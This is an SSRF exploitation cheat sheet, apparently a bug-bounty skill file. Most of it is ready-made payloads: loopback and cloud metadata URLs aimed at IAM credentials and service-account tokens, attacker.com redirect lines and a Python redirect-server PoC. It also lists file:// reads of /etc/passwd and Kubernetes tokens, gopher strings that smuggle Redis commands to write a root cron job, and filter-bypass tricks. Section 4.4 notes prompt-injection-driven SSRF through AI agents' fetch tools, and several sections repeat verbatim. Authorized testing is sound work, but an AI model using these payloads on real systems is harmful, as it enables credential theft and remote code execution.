http://attacker.com/redirect?url=http://169.254.169.254/
https://attacker.com/302?to=http://127.0.0.1/
http://attacker.com/open?next=http://metadata.google.internal/
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://metadata.google.internal.nip.io/
http://spoofed.burpcollaborator.net/
http://127.0.0.1.sslip.io/
http://localhost.localdomain/
http://localhost./
```

### Non-HTTP schemes

```text
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
sftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/
netdoc:///etc/passwd
jar:http://127.0.0.1/x.jar!/
php://filter/convert.base64-encode/resource=index.php
expect://id
```

### Protocol smuggling (gopher / redis / memcached)

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0D%0A%0A%2A%2F%2A%20%2A%20%2A%20%2A%20%2A%20root%0D%0A
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_set%20x%200%200%201%0D%0Aa%0D%0A
gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A
gopher://127.0.0.1:3306/_
gopher://127.0.0.1:5432/_
gopher://127.0.0.1:9000/_
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` (85)
- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` (26 filter/WAF-focused)

### Parameters observed

`url` · `hash` · `username` · `template` · `password` · `id` · `data` · `payload` · `alt` · `format` · `email` · `month` · `year` · `template[]` · `image` · `name` · `target` · `start` · `command` · `user_id`

### SSRF in Exchange leads to ROOT access in all instances

`#341876` · Shopify · $0 · medium · 2018-05-23 · ▲587
> The Exploit Chain - How to get root access on all Shopify instances 1 - Access Google Cloud Metadata - 1: Create a store (partners.shopify.com) - 2: Edit the template password.liquid and add the following content: - 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app - 4: Wait for the store screenshot to appear on the Create Listing page - 5: Download the PNG and open it using image editing software or convert it to JPEG…

### Server Side Request Forgery (SSRF) via Analytics Reports

`#2262382` · HackerOne · $25,000 · critical · 2023-12-08 · ▲529
> Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability. Proof of concept + ███ Impact SSRF. Thanks and have a nice day!

### Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata

`#530974` · Snapchat · $0 · n/a · 2020-11-30 · ▲421
> Hey there, I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps: POC - Login to https://business.snapchat.com/ - Go to creative library - New Creative - Under "Topsnap Media", click on "Create" - Click on any of the templates and load it - Click on one of the images in the template - Replace - Import - This is where the SSRF exists .

### SSRF on project import via the remote_attachment_url on a Note

`#826361` · GitLab · $10,000 · high · 2020-06-07 · ▲359
> The Note model has an attachment which is provided by a CarrierWave uploader: One of the features this provides is the ability to download and attach a file via a url, see https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L80. This means that the Note model has a method remote attachment url= which can be used to perform this action.

### Default workflow

1. **Plant the Collaborator payload first.** Sub-tagging (`dlsrcurl.<collab>`,
   `import.<collab>`) only works if your listener actually reports the queried
   subdomain back to you — **verify that before relying on it.** Burp's
   `get_collaborator_interactions` keys results by **payload ID, not by subdomain**,
   so several sub-tags generated from one payload are indistinguishable in the
   output. When that is the case, **generate a fresh payload per candidate
   parameter** and send exactly one request per payload.
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.

**Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.

### Attribute the callback to ONE parameter before reporting

A callback proves the server made a request. It does **not** tell you which
parameter caused it, and the fix depends entirely on that.

```
BAD   — four candidate fields, one payload, fired in one batch
        -> callbacks arrive, attribution impossible, retest required

GOOD  — fresh payload per field, one request each, poll between
        url      -> callbacks    <- this is the sink
        apiUrl   -> none
        endpoint -> none
        target   -> none
```

**Run the negative control.** A parameter that produces *no* callback is evidence,
and it belongs in the report — it is what lets the client fix the right field
instead of allowlisting the wrong one.

**Lesson from an authorized engagement.** A server-side request-forwarding endpoint
accepted both `url` and `apiUrl`. The application's own stored config used `apiUrl`,
so that was the obvious suspect — but `apiUrl` was inert and **`url` was the live
sink**.
Batch-firing both had produced callbacks with no attribution; only per-payload
isolation identified the real parameter. A report naming `apiUrl` would have sent
the client to patch a field that does nothing.

### Blind vs full-read — establish which before scoring

After a callback confirms the request leaves the server, **check whether the
upstream response body is returned to you.** These are different findings:

- **Blind** (callback only, no body): on the never-submit list standalone. Needs an
  internal service reached, or data returned, to be reportable.
- **Full-read** (upstream body in the response): substantially higher severity —
  read arbitrary internal endpoints directly.

```bash
# one request settles it: fetch something with a known, recognisable body
-d '{"url":"https://example.com/"}'
# {"statusCode":200,"data":"<!doctype html>...<title>Example Domain</title>..."}
#                          ^ body returned = full-read, not blind
```

Also body-diff a known-internal target against a known-external one. A **distinct
status** on a link-local address (e.g. `401` from `169.254.169.254` where every
other target returns `200`) is the metadata service answering — that proves reach
to a non-internet-routable address, which a status code alone otherwise cannot.


---

### URL Patterns to Hunt

```
/api/*/preview
/api/*/fetch
/api/*/import
/api/*/webhook
/api/*/proxy
/api/*/render
/api/*/link
/api/*/screenshot
/api/*/export
/api/*/validate
?url=
?uri=
?endpoint=
?redirect=
?src=
?source=
?feed=
?host=
?target=
?dest=
?file=
?path=
?callback=
?image=
?load=
?fetch=
```

### JS Patterns (in client-side code)

```javascript
// Look for these in JS bundles
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

### Scenario A: Cloud Credential Exfiltration via Link Preview (Snapchat/GCP Pattern)

A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate thumbnail content. The feature ran on GCP Compute Engine with IMDSv1 enabled and no `Metadata-Flavor` header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

### Scenario B: Kubernetes API Compromise via Hijacked Aggregated Server (Kubernetes Pattern)

An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. This effectively allowed an attacker with limited API registration privileges to escalate to full cluster secret read access — a critical privilege escalation via SSRF chained through trusted infrastructure components.

---

### Disclosed Report Citations (Backfill +6 — 2018-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Cloud-metadata SSRFs across all three providers, DNS rebinding, gopher-to-Redis-RCE, link-preview SSRF, and headless-browser/PDF-generator chains are all represented.

3. **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** ([H1 #2262382](https://hackerone.com/reports/2262382) · [Writeup](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e))
    - Subclass: headless-browser SSRF (PDF generator) → AWS metadata SSRF (IMDSv1)
    - Payload: injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
    - Root cause: unsanitised user-controlled template fragment reflected in PDF rendering pipeline; no IMDSv2 enforcement
    - Year: 2023 — **$25,000** (CVSS 10.0 Critical)

4. **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** ([H1 #341876](https://hackerone.com/reports/341876))
    - Subclass: GCP metadata SSRF → SSRF-to-RCE chain
    - Payload: created store on partners.shopify.com, edited `password.liquid` template to embed a request to `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`, then triggered the Exchange screenshotting service to render the template server-side
    - Root cause: screenshotter fetched user-controlled template with no metadata-host blocklist and no metadata-concealment proxy
    - Year: 2018 — **$25,000** (canonical headless-browser → metadata)

5. **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** ([H1 #1369312](https://hackerone.com/reports/1369312))
    - Subclass: DNS rebinding SSRF → AWS metadata SSRF (IMDSv1)
    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `1.2.3.4` (public) and `169.254.169.254`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
    - Root cause: validated hostname by resolving once; download path re-resolved DNS without pinning the validated IP
    - Year: 2021 — fixed in 8.5.7 / 9.0.1

6. **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** ([Writeup](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530))
    - Subclass: gopher protocol abuse → Redis SSRF → SSRF-to-RCE chain
    - Payload: blind SSRF in Yahoo Mail backend reached via `gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall...SET stuff /var/spool/cron/root...BGSAVE` — wrote a cron via Redis to get command execution
    - Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on default port; SSRF target accepted 302 redirect from attacker host to `gopher://`
    - Year: 2020 — **$15,000**

7. **Reddit Matrix — Blind SSRF in `preview_url` API** ([H1 #1960765](https://hackerone.com/reports/1960765))
    - Subclass: link-preview SSRF (blind, internal port-scan via timing/response codes)
    - Payload: `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://10.0.0.0:80/` — varied internal IPs/ports; service names and IPs leaked through response differences before the fix
    - Root cause: link-preview fetcher did not reject RFC1918 / link-local destinations; allowlist-by-scheme only
    - Year: 2023 — **$6,000**

8. **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** ([Binary Security writeup](https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops))
    - Subclass: webhook URL field SSRF + DNS rebinding SSRF → Azure IMDS / managed identity
    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `169.254.169.254`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
    - Root cause: validation-then-fetch with separate DNS lookups; CRLF in URL path injected headers needed by Azure IMDS
    - Year: 2023-2024 — **$15,000 total** across 3 reports

---

### Default workflow

1. **Plant the Collaborator payload first.** Sub-tagging (`dlsrcurl.<collab>`, `import.<collab>`) only works if your listener actually reports the queried subdomain back — **verify before relying on it.** Burp's `get_collaborator_interactions` keys results by **payload ID, not subdomain**, so several sub-tags generated from one payload are indistinguishable. When that's the case, **generate a fresh payload per candidate parameter** and send exactly one request per payload.
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: retract all SSRF claims, even if error messages echo URLs.

### Real lessons (retain these — they save failed reports)

**Lesson A (SharePoint):** `/_layouts/15/download.aspx?SourceUrl=` returned 500 with title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF. **38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded zero DNS or HTTP interactions.** The "echo" was client-side error-string formatting; the server never made an outbound request. The path is an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this would have been N/A'd.

**Lesson B (parameter attribution):** A server-side request-forwarding endpoint accepted both `url` and `apiUrl`. The app's own stored config used `apiUrl` — the obvious suspect — but `apiUrl` was inert and **`url` was the live sink**. Batch-firing both produced callbacks with no attribution. Only per-payload isolation identified the real parameter.

```
BAD — four candidate fields, one payload, fired in one batch
-> callbacks arrive, attribution impossible, retest required

GOOD — fresh payload per field, one request each, poll between
url -> callbacks <- this is the sink
apiUrl -> none
endpoint -> none
target -> none
```

**Run the negative control.** A parameter that produces *no* callback is evidence and belongs in the report — it lets the client fix the right field instead of allowlisting the wrong one.

### Blind vs full-read — establish which before scoring

After a callback confirms the request leaves the server, **check whether the upstream response body is returned to you.**

- **Blind** (callback only, no body): on the never-submit list standalone. Needs an internal service reached, or data returned, to be reportable.
- **Full-read** (upstream body in the response): substantially higher severity — read arbitrary internal endpoints directly.
- **Half-blind**: body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document (see §4.9).

```bash
# one request settles it: fetch something with a known, recognisable body
-d '{"url":"https://example.com/"}'
# {"statusCode":200,"data":"<!doctype html>...<title>Example Domain</title>..."}
#                          ^ body returned = full-read, not blind
```

Also body-diff a known-internal target against a known-external one. A distinct status on a link-local address (e.g. 401 from 169.254.169.254 where every other target returns 200) is the metadata service answering — that proves reach to a non-internet-routable address, which a status code alone otherwise cannot.

---

### 1.1 Functionality that makes outbound requests

Any feature where the server fetches a resource on the app's behalf is a candidate:

**URL-accepting parameters** — anything taking a URL, link, image, file, or "source" the server fetches:
- avatar/profile-picture-by-URL, "import from URL"
- RSS/feed readers, link unfurling/preview (Slack-style)
- webhooks (registering + "test" features)
- PDF/document generators that accept a URL or render HTML with remote resources
- screenshot/thumbnail services
- SSO/SAML metadata URL fields, OAuth redirect_uri / discovery endpoints
- "share this page" / social-card generators

**File upload/import pipelines** that fetch remote content:
- SVG/image processors that resolve external entities or xlink:href
- document converters (DOCX/PDF) that follow embedded remote references
- CSV/data importers with a "from URL" option
- API integrations ("connect your data source", "test connection" for DB/cache/webhook — see §4.11)

**Hidden/indirect fetchers** — things that don't look like "enter a URL":
- XML parsers (XXE → SSRF via external entities)
- server-side templating that resolves includes
- PDF renderers executing JS/CSS that references external URLs
- markdown/wiki renderers that fetch remote images for caching
- "report a broken link"/URL validators
- OpenGraph/metadata scrapers
- webhooks for CI/CD or issue trackers
- cloud/edge functions that proxy a user-supplied URL (see §4.15)
- LLM/agent toolchains where a tool fetches a URL from model output or untrusted "documentation" (prompt-injection-driven SSRF — see §4.4–4.5)

**Multi-tenant / cloud-native surfaces** — service mesh control planes (Istio jwksUri, §4.7), Kubernetes admission webhooks, CI pipeline integrations, Docker/container platforms with management APIs (§4.12).

### 2.1 Loopback & internal services

```
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://127.1/
http://127.0.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/
http://localhost.localdomain/
http://localhost./
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://127.0.0.1:11211/
http://127.0.0.1:9200/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:8500/v1/catalog/services
http://127.0.0.1:6443/api/v1/namespaces    # kube-apiserver
http://127.0.0.1:10250/pods                # kubelet
http://127.0.0.1:2379/v2/keys              # etcd
http://127.0.0.1:9090/                     # Prometheus
http://127.0.0.1:5601/                     # Kibana
```

### 2.2 Cloud metadata

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}    # ECS task

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# OpenStack / DigitalOcean / Aliyun
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/openstack/latest/meta_data.json
http://100.100.100.200/latest/meta-data/
http://192.0.0.192/latest/meta-data/
```

### 2.4 Redirect & DNS tricks

```
http://attacker.com/redirect?url=http://169.254.169.254/
https://attacker.com/302?to=http://127.0.0.1/
http://attacker.com/open?next=http://metadata.google.internal/
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://metadata.google.internal.nip.io/
http://spoofed.burpcollaborator.net/
http://127.0.0.1.sslip.io/
```

### 2.5 Non-HTTP schemes

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
sftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/
netdoc:///etc/passwd
jar:http://127.0.0.1/x.jar!/
php://filter/convert.base64-encode/resource=index.php
expect://id
```

### 2.6 Protocol smuggling (gopher / redis / memcached / SMTP)

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0D%0A%0A%2A%2F%2A%20%2A%20%2A%20%2A%20%2A%20root%0D%0A
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_set%20x%200%200%201%0D%0Aa%0D%0A
gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A
gopher://127.0.0.1:3306/_
gopher://127.0.0.1:5432/_
gopher://127.0.0.1:9000/_
```

### 2.7 IPv6 transition / NAT64 / 6to4 / Teredo (post-basic guards)

```
# NAT64 embedding 169.254.169.254
http://[64:ff9b::a9fe:a9fe]/
# 6to4 embedding 127.0.0.1
http://[2002:7f00:0001::]/
# Teredo (client IPv4 XORed with 0xFFFFFFFF in last 32 bits)
http://[2001:0000:...]/
# Unspecified → loopback
http://0.0.0.0:8080/
http://[::]:8080/
http://0:0:0:0:0:0:0:0/
```

### 2.8 Non-IP internal hostnames

```
http://host.docker.internal:8080/
http://kubernetes.default.svc/
http://metadata.google.internal/
http://<service>.internal/
http://<service>.corp/
http://<service>.local/
http://192.168.65.7:2375/containers/json          # Docker Desktop Engine
http://host.docker.internal:2375/version
```

### 2.9 Redirect-server PoC (when direct is blocked)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
```

### Part 3 — Classification: full-read, blind, half-blind

After OOB confirms the request fires, classify what you actually have (see the OOB gate for the definition test):

- **Full-read SSRF** — response body (or part) is reflected to you. Highest value: read internal services / metadata directly.
- **Blind SSRF** — request fires (OOB confirmed) but nothing comes back in the response. Still exploitable (port scanning via timing/error differences, protocol smuggling, write-only targets like Redis).
- **Half-blind SSRF** — HTTP body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document (see §4.9). Don't classify a request as "pure blind" just because the body is empty.

For blind/half-blind, differentiate timing even without OOB: closed port, filtered port, and open-but-non-HTTP port (Redis/Memcached) each produce distinguishable error messages or response times — useful for internal port scanning once you have any SSRF primitive.

---

### 4.1 IPv6 transition addresses embedding internal IPv4

Guards that only recognize `::ffff:`, `fe80::`, and `::1` miss IPv4 embedded in transition prefixes. On a NAT64/DNS64 network (common in IPv6-only/IPv6-first clouds), these look "public IPv6" to `is_private()`/`is_global()` but the stack routes them to the embedded private IPv4.

```
# NAT64 embedding 169.254.169.254
http://[64:ff9b::a9fe:a9fe]/
# 6to4 embedding 127.0.0.1
http://[2002:7f00:0001::]/
# Teredo (client IPv4 XORed with 0xFFFFFFFF in last 32 bits)
http://[2001:0000:...]/
```

Bypassed ToolHive, TREK, and others. Also see pyLoad-ng CVE-2026-48737 (§4.19).

### 4.2 0.0.0.0 and [::] — unspecified addresses that resolve to loopback

On Linux, `0.0.0.0` as a destination routes to local loopback, and `[::]` routes to `[::1]`. Most guards check 127.0.0.0/8/localhost but not 0.0.0.0/8 or ::/128 — threat model is "block loopback," but these are classified as unspecified, not loopback, while behaving as loopback.

```
http://0.0.0.0:8080/
http://[::]:8080/
http://0:0:0:0:0:0:0:0/
```

Real cases: new-api stayed bypassable via 0.0.0.0 after CVE-2025-59146/62155 fixes; imgproxy CVE-2025-24354 still reached localhost via 0.0.0.0 even with loopback blocking; local-deep-research missed `::`, `0::`, `::0` variants entirely.

### 4.3 Parser differentials (validator vs fetcher disagree on the host)

**4.3.1 Backslash / control-byte confusion.** `urllib.parse.urlparse` and `urllib3`/`requests` parse `http://127.0.0.1\@1.1.1.1` differently — one extracts `1.1.1.1` (passes validation), the other connects to `127.0.0.1`. Fix: reject backslashes/control bytes/whitespace and extract the host with the same parser the HTTP client uses.

```
http://127.0.0.1\@attacker.com/
http://127.0.0.1%09@attacker.com/
http://127.0.0.1%00.attacker.com/
```

**4.3.2 Percent-encoded host / normalize() bugs.** Same class as CVE-2025-1211 but in different functions (e.g. Hackney's `hackney_url:normalize/2`). Don't stop at one `url=` form — test the host under multiple decode passes if the param goes through any pre-processing. Also see Angular CVE-2026-50168 (§4.19).

### 4.4 Non-IP internal hostnames

Guards that are purely IP-regex-based miss these entirely:

- `host.docker.internal` — reaches the Docker host from a container
- `kubernetes.default.svc` — in-cluster K8s API DNS name
- `*.internal` / `*.corp` / `*.local` — enterprise internal DNS suffixes
- `metadata.google.internal` — GCP metadata short name (often ignored even when 169.254.169.254 is blocked)

Exploited via Apify MCP's fetch-apify-docs and FlowiseAI's API-chain component, where attacker-supplied fake "API documentation" (via prompt injection) set a BASE URL redirecting to `host.docker.internal:8080` or an internal `.local` host. Most hunters stop after 169.254.169.254 and never try these — in containerized/orchestrated environments they're often less filtered than IPs.

### 4.7 Service mesh: Istio jwksUri and Envoy header leakage

**Istio `RequestAuthentication.jwksUri`.** When a RequestAuthentication resource's jwksUri points internally, istiod makes an unauthenticated GET with no localhost/link-local filtering, and the result can be distributed via xDS to every sidecar in the mesh.

```yaml
jwksUri: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Envoy metadata leakage.** Headers like `x-envoy-peer-metadata`, `x-envoy-peer-metadata-id`, or `server: envoy` on a blind SSRF response confirm you've entered an Istio mesh and leak Pod/service identity. If policy allows the final hop, probe `/config_dump` to pull full mesh config (routes, clusters, secrets).

### 4.9 Half-blind SSRF — response surfaces outside the body

Distinct from the blind/full-read binary: the HTTP body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document.

- CVE-2025-13281 (Kubernetes Portworx): kube-controller-manager's GET response leaked into a `ProvisioningFailed` event object — attacker couldn't control the request body but could read the response.
- PDF/rendering pipelines that execute JS can draw internal response content into the returned PDF/image — the document becomes the exfil channel.

When the body comes back empty, check: does an error echo internal-response fragments? Do `kubectl get events` show the provisioner's response? Does a returned PDF/image contain internal text?

### 4.10 Forwarded-header URL reconstruction

Astro's `createRequest()` builds URLs from unsanitized `x-forwarded-proto`/`x-forwarded-port`. Injecting a protocol-layer payload rewrites the whole URL (host/port/path) while stuffing the real host/path into the query string, so routing looks unaffected:

```
x-forwarded-proto: https://www.malicious-url.com/?tank=
# constructed: https://www.malicious-url.com/?tank=://localhost/ssr
```

This doubles as a middleware/protected-route bypass and a cache-poisoning vector. Applies to any SSR framework building URLs from `X-Forwarded-*` headers (Astro, Next.js, Nuxt, Remix) — test these headers as SSRF vectors, not just `?url=`.

### 4.12 Docker Engine API as an internal SSRF target

Docker Desktop CVE-2025-9074 (CVSS 9.3): the Docker Engine API is reachable unauthenticated from inside a container at `http://192.168.65.7:2375/`, even with Enhanced Container Isolation on — enabling container creation and host filesystem access. Most SSRF port-scan lists only include 127.0.0.1/169.254.169.254, not this address.

```
http://192.168.65.7:2375/containers/json
http://host.docker.internal:2375/version
```

### 4.13 Gopher CRLF smuggling (curl doesn't sanitize the selector)

curl's gopher implementation doesn't sanitize `%0d%0a` in the selector path, letting you inject arbitrary TCP commands into Redis/Memcached/SMTP even when the SSRF only allows gopher and the selector is assumed "safe":

```
gopher://127.0.0.1:11211/_Dummy%0d%0aHELLO_SERVER%0d%0a
```

Test whether CRLF in the selector decodes to raw bytes — on an old or curl-based HTTP client this can lead directly to Redis `CONFIG SET`/`SAVE`/authorized_keys writes → RCE.

### 4.14 Static DNS CNAME to metadata/internal (no rebinding race needed)

A simpler, more stable alternative to DNS-rebinding TOCTOU: register a CNAME pointing directly at a metadata IP or internal hostname.

```
attacker.com.       CNAME  metadata.google.internal.
evil.attacker.com.  A      169.254.169.254
```

If the guard resolves once and checks the IP, the CNAME returns the internal address on first resolution. If the guard checks the hostname string, the CNAME looks like a normal external domain. Try static CNAME before escalating to rebinding (TTL=0 + race).

### 4.15 Cloud / Edge Function: SSRF + cross-tenant write combo

Multi-tenant SaaS Edge Functions can have both an SSRF (fetch a user-supplied URL) and a cross-tenant write (store the result in an arbitrary workspace). Example: a Supabase-backed "zip my submission files" Edge Function fetched an attacker URL and wrote the archive into an arbitrary workspace's storage folder. When you find a URL input in a cloud/Edge Function, also check where the fetched result gets written — if that path is also user-controlled, blind SSRF escalates to cross-tenant data write/overwrite.

### 4.16 DNS rebinding (when static CNAME isn't possible)

- Validate URL → sleep → redirect to internal (race between DNS validation and fetch)
- Register a domain with 0-TTL, rotate DNS between validation and fetch calls
- Use https://lock.cmpxchg8b.com/rebinder.html to prototype

Real cases: Concrete CMS (H1 #1369312), GitLab UrlBlocker, Azure DevOps endpointproxy (Binary Security).

### 4.17 TOCTOU — the root pattern

Any guard that resolves once, checks the IP, then hands the hostname to a normal HTTP client is a strong signal. The HTTP stack will resolve again at connect time — that second resolution is the bypass. Correct implementations pin the already-approved address to the actual connect call. When you see "DNS check then `requests.get()`", suspect rebinding or redirect-based bypass.

### 4.18 Quick reference table — advanced vectors

| Vector | Why hunters miss it | Minimal payload |
|---|---|---|
| NAT64/6to4/Teredo embedding IPv4 | Guards only check `::ffff:`/`fe80::` | `http://[64:ff9b::a9fe:a9fe]/` |
| 0.0.0.0 / [::] | Classed as unspecified, not loopback | `http://0.0.0.0:8080/` |
| Backslash/control-byte parser diff | Only IP encodings tested | `http://127.0.0.1\@attacker.com/` |
| host.docker.internal / *.svc / *.internal | Guards only block IP literals | `http://host.docker.internal:8080/` |
| startsWith() allowlist bypass | Only param values tested, not domain strings | `https://docs.trusted.com.evil.com/` |
| CDN edge /cdn-cgi/image/ path confusion | Only app params tested | `https://victim.com/cdn-cgi/image/x/https://attacker.com/` |
| Istio jwksUri | Only app layer tested, not control-plane resources | `jwksUri: http://169.254.169.254/...` |
| IMDSv2/Azure header injection | Assumes IMDSv2 unbypassable | Webhook header named `Metadata` / `X-aws-ec2-metadata-token` |
| Half-blind (events/errors/documents) | Gives up when body is empty | Check `ProvisioningFailed` events / returned PDF |
| x-forwarded-proto URL rewrite | Only ?url= tested, not headers | `x-forwarded-proto: https://evil.com/?x=` |
| JDBC allowLoadLocalInfile | Treats "test connection" as blind-only | `jdbc:mysql://...?allowLoadLocalInfile=true` |
| Docker 192.168.65.7:2375 | Port-scan lists omit Docker Desktop internal IP | `http://192.168.65.7:2375/containers/json` |
| Gopher CRLF not sanitized | Assumes gopher selector is safe | `gopher://127.0.0.1:6379/_%0d%0aCONFIG...` |
| Static CNAME → metadata | Jumps straight to rebinding | `evil.com CNAME metadata.google.internal` |
| App-layer base64/double-encode | Only ?url= plain tested | `/proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/` |
| ;/ path-confusion | Only app params tested | `/;/;/resource/md/get/url?url=http://oast/` |

### 4.19 Non-HTTP protocol checklist

Beyond gopher, check what protocols the actual fetch library supports, not just what the feature's UI implies:

- `file://` and local-resource handlers (local file read via a feature that only looks like it does HTTP)
- legacy `ftp://` handlers
- XML external entities / external document references (XXE escalating straight into SSRF)
- archive and media-library URL handlers that fetch nested resources
- custom SDK schemes and browser custom-protocol/embedded-resource handlers

A validator that only checks `http(s)://` doesn't mean the underlying library can't be reached with another scheme — test scheme handling explicitly as its own axis, separate from host/IP bypasses.

**Verified 2025–2026 CVEs / advisories:**

| Reference | Root-cause lesson |
|---|---|
| CVE-2026-45310 — CodeWhale/DeepSeek TUI | Initial URL checked, but client followed redirects without re-applying destination policy (same as §4.8/§4.10 redirect gap) |
| CVE-2026-33626 — LMDeploy | Vision-language image_url loading path fetched remote URLs without adequate destination validation — confirms §5.5 "LLM media loader" sink class |
| CVE-2026-50168 — Angular platform-server | WHATWG URL and lenient Domino parser disagreed during SSR → allowlist bypass — textbook parser differential (§4.3) |
| CVE-2026-26019 / CVE-2026-27795 — LangChain Community | Same-origin check used string-prefix comparison (§4.5 startsWith() bypass); a later fix was itself bypassed via redirects |
| CVE-2026-48737 — pyLoad-ng | Global-address classifier missed IPv6 transition-address cases — same class as §4.1 (NAT64/6to4), reachability depends on host's NAT64/6to4 routing |
